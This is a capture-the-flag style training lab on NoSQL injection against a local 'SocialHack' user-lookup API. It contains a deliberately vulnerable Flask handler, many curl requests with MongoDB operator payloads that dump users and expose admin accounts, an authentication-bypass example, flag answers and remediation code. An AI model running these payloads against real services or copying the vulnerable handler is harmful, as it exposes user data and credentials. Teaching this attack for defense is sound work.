# Lab: NoSQL Injection via User-Lookup Endpoint

## Objective

Discover and exploit NoSQL injection vulnerabilities in the SocialHack API's user-lookup tool. You will use MongoDB-style query operators (`$ne`, `$gt`, `$regex`, `$eq`, `$exists`, `$in`) to bypass filters, dump all user data, and chain operators for advanced data extraction.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Medium |
| **Estimated Time** | 45 minutes |
| **Prerequisites** | Labs 01–05 completed, basic understanding of NoSQL databases, Python 3 with `requests` |
| **OWASP API Category** | API8:2023 – Security Misconfiguration / Injection |

---

## Background

### What Is NoSQL Injection?

NoSQL injection exploits application logic that processes JSON query objects by injecting **MongoDB-style query operators** into input fields. Unlike SQL injection (which uses string-based payloads), NoSQL injection leverages the structured nature of JSON to manipulate query logic.

### MongoDB Query Operators

| Operator | Meaning | Example |
|---|---|---|
| `$ne` | Not equal to | `{"username":{"$ne":""}}` — matches all non-empty usernames |
| `$gt` | Greater than | `{"age":{"$gt":18}}` — matches age > 18 |
| `$lt` | Less than | `{"age":{"$lt":100}}` |
| `$gte` / `$lte` | Greater/less than or equal | `{"score":{"$gte":90}}` |
| `$eq` | Equal to | `{"role":{"$eq":"admin"}}` |
| `$regex` | Regular expression match | `{"email":{"$regex":"admin"}}` |
| `$exists` | Field exists | `{"api_key":{"$exists":true}}` |
| `$in` | Value in array | `{"role":{"$in":["admin","moderator"]}}` |

### Vulnerable Code Pattern

```python
# VULNERABLE — directly uses JSON input as query filter
@app.route("/api/v1/tools/user-lookup", methods=["POST"])
def user_lookup():
    query = request.get_json()
    # Passes attacker-controlled JSON directly to the query engine
    results = db.users.find(query)
    return jsonify(results)

# SAFE — validates input type and whitelist fields
def user_lookup_safe():
    data = request.get_json()
    username = data.get("username")
    if not isinstance(username, str):
        abort(400, "Username must be a string")
    results = db.users.find({"username": username})
    return jsonify(results)
```

### Why This Matters

NoSQL injection can:
- **Bypass authentication** — `{"password":{"$ne":""}}`
- **Dump entire collections** — `{"username":{"$ne":""}}`
- **Extract sensitive data** — `{"role":{"$eq":"admin"}}`
- **Enumerate hidden fields** — `{"api_key":{"$exists":true}}`

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5001` |
| Vulnerable Endpoint | `POST /api/v1/tools/user-lookup` |
| Auth Required | Yes (any valid JWT) |
| Default Users | alice, bob, charlie, admin, diana |

---

## Tasks

### Task 1: Test Normal User Lookup

**Goal:** Understand how the user-lookup endpoint works with legitimate input.

**Steps:**

1. Login and save the token:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

2. Look up alice normally:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":"alice"}'
```

3. Look up bob:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":"bob"}'
```

4. Try looking up a non-existent user:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":"nonexistent"}'
```

5. Note the response structure — what fields are returned?

<details>
<summary>Hint 1</summary>
The endpoint accepts a JSON body with query criteria. A normal lookup uses <code>{"username":"alice"}</code> to find a specific user.
</details>

<details>
<summary>Hint 2</summary>
The response should include user fields like <code>id</code>, <code>username</code>, <code>email</code>, <code>role</code>, and possibly more. Note what fields are visible.
</details>

<details>
<summary>Hint 3</summary>
A non-existent user should return an empty result or a "user not found" message. The key is understanding what happens when you send different query structures.
</details>

---

### Task 2: Dump All Users with $ne Operator

**Goal:** Use the `$ne` (not equal) operator to retrieve all users from the database.

**Steps:**

1. Instead of searching for a specific username, search for all usernames that are **not equal to** an empty string:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":{"$ne":""}}'
```

2. Count the number of users returned.

3. Try with `$ne` on other fields:

```bash
# All users where email is not empty
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":{"$ne":""}}'

# All users where role is not "user"
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$ne":"user"}}'
```

> **🚩 FLAG 1:** How many users are returned with `{"username":{"$ne":""}}`?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
The <code>$ne</code> operator matches all documents where the field is NOT equal to the specified value. Since no username is an empty string, this should match ALL users.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
Count the entries in the JSON response. The API has 5 default users: alice, bob, charlie, admin, and diana.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The answer is <code>5</code>. All five default users (alice, bob, charlie, admin, diana) are returned because none of them have an empty username.
</details>

---

### Task 3: Find Users with High Login Counts using $gt

**Goal:** Use the `$gt` (greater than) operator to find users with suspiciously high login counts.

**Steps:**

1. Search for users with login_count greater than 100:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"login_count":{"$gt":100}}'
```

2. Try different thresholds:

```bash
# Greater than 50
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"login_count":{"$gt":50}}'

# Greater than 200
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"login_count":{"$gt":200}}'

# Less than 10
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"login_count":{"$lt":10}}'
```

3. Note which users appear at each threshold level.

> **🚩 FLAG 2:** Which users have `login_count` > 100? What are their login counts?

<details>
<summary>Hint 1</summary>
The <code>$gt</code> operator works on numeric fields. Not all users will have high login counts — look for power users or administrators.
</details>

<details>
<summary>Hint 2</summary>
Try <code>{"login_count":{"$gt":100}}</code> first, then <code>{"login_count":{"$gt":200}}</code> to narrow it down. Admin accounts often have the highest login counts.
</details>

<details>
<summary>Hint 3</summary>
The users with login_count > 100 are <strong>bob</strong> (128) and <strong>admin</strong> (500). Try <code>$gt: 200</code> to isolate just the admin.
</details>

---

### Task 4: Find Admin Emails using $regex

**Goal:** Use the `$regex` operator to search for patterns in user data, specifically to find admin-related emails.

**Steps:**

1. Search for emails containing "admin":

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":{"$regex":"admin"}}'
```

2. Try other regex patterns:

```bash
# Find emails from a specific domain
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":{"$regex":"@socialhack"}}'

# Find usernames starting with 'a'
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":{"$regex":"^a"}}'

# Find users with 'admin' or 'moderator' in their role
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$regex":"admin|moderator"}}'
```

> **🚩 FLAG 3:** What is the admin user's email found via `$regex`?

<details>
<summary>Hint 1</summary>
Use <code>{"email":{"$regex":"admin"}}</code> to find any email that contains the word "admin".
</details>

<details>
<summary>Hint 2</summary>
The admin email likely follows the pattern <code>admin@domain.com</code>. Check the returned data for the exact email address.
</details>

<details>
<summary>Hint 3</summary>
The admin's email is likely <code>admin@socialhack.com</code> or <code>admin@example.com</code>. Check the actual API response.
</details>

---

### Task 5: Find All Admin Users with $eq

**Goal:** Use the `$eq` (equals) operator to precisely target specific user roles.

**Steps:**

1. Find all admin users:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$eq":"admin"}}'
```

2. Find all moderators:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$eq":"moderator"}}'
```

3. Use `$in` to find users with privileged roles:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$in":["admin","moderator"]}}'
```

4. Check for users with specific fields using `$exists`:

```bash
# Find users that have an api_key field
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"api_key":{"$exists":true}}'
```

<details>
<summary>Hint 1</summary>
The <code>$eq</code> operator is similar to a normal equality query but wrapped in operator syntax. It's useful when the application specifically blocks simple string values.
</details>

<details>
<summary>Hint 2</summary>
The <code>$in</code> operator matches any value from an array. Use it to check for multiple roles at once: <code>{"role":{"$in":["admin","moderator"]}}</code>.
</details>

<details>
<summary>Hint 3</summary>
The admin user (id=4) has role "admin" and diana (id=5) has role "moderator". The <code>$in</code> query with both roles should return both users.
</details>

---

### Task 6: Chain Operators for Advanced Extraction

**Goal:** Combine multiple query operators in a single request to extract precisely targeted data.

**Steps:**

1. Find non-user accounts that are verified:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$ne":"user"},"is_verified":{"$eq":true}}'
```

2. Find admin/moderator accounts with high login counts:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role":{"$ne":"user"},"login_count":{"$gt":50}}'
```

3. Find users with emails matching a pattern AND a specific role:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":{"$regex":"@"},"role":{"$ne":"user"}}'
```

4. Find all verified users who are NOT regular users:

```bash
curl -s -X POST http://localhost:5001/api/v1/tools/user-lookup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"is_verified":true,"role":{"$in":["admin","moderator"]}}'
```

<details>
<summary>Hint 1</summary>
You can specify multiple field conditions in a single JSON object. The server treats them as AND conditions: all must match.
</details>

<details>
<summary>Hint 2</summary>
Try combining <code>$ne</code> on the role field with <code>$gt</code> on numeric fields to find privileged users with specific characteristics.
</details>

<details>
<summary>Hint 3</summary>
The query <code>{"role":{"$ne":"user"},"is_verified":{"$eq":true}}</code> returns admin and moderator accounts that have verified status. This reveals privileged accounts.
</details>

---

## Flags Summary

| Flag | Description | Expected Value |
|---|---|---|
| FLAG 1 | Number of users with `{"username":{"$ne":""}}` | `5` |
| FLAG 2 | Users with login_count > 100 | bob (128), admin (500) |
| FLAG 3 | Admin's email found via `$regex` | Check API response (e.g., `admin@socialhack.com`) |

---

## Remediation

### 1. Validate Input Types

```python
def user_lookup():
    data = request.get_json()
    username = data.get("username")

    # CRITICAL: Ensure the value is a plain string, not a dict/operator
    if not isinstance(username, str):
        return jsonify({"error": "Username must be a string"}), 400

    results = db.users.find({"username": username})
    return jsonify(results)
```

### 2. Sanitize Query Operators

```python
import re

def sanitize_query(query):
    """Strip any MongoDB operators from user input."""
    if isinstance(query, dict):
        return {k: sanitize_query(v) for k, v in query.items()
                if not k.startswith("$")}
    if isinstance(query, list):
        return [sanitize_query(item) for item in query]
    return query
```

### 3. Whitelist Allowed Query Fields

```python
ALLOWED_FIELDS = {"username", "email"}

def user_lookup():
    data = request.get_json()

    # Only allow whitelisted fields
    query = {}
    for key, value in data.items():
        if key not in ALLOWED_FIELDS:
            return jsonify({"error": f"Field '{key}' not searchable"}), 400
        if not isinstance(value, str):
            return jsonify({"error": f"Field '{key}' must be a string"}), 400
        query[key] = value

    results = db.users.find(query)
    return jsonify(results)
```

### 4. Use Parameterized Queries

```python
# For MongoDB with PyMongo
from bson import Regex

def safe_user_lookup(username):
    # Parameterized — username is always treated as a literal string
    return db.users.find_one({"username": {"$eq": str(username)}})
```

### 5. Limit Returned Fields

```python
# Never return sensitive fields
SAFE_PROJECTION = {"password_hash": 0, "api_key": 0, "internal_notes": 0}

results = db.users.find(query, SAFE_PROJECTION)
```

---

## References

- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [MongoDB Operator Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [CWE-943: Improper Neutralization in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)
- [OWASP API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
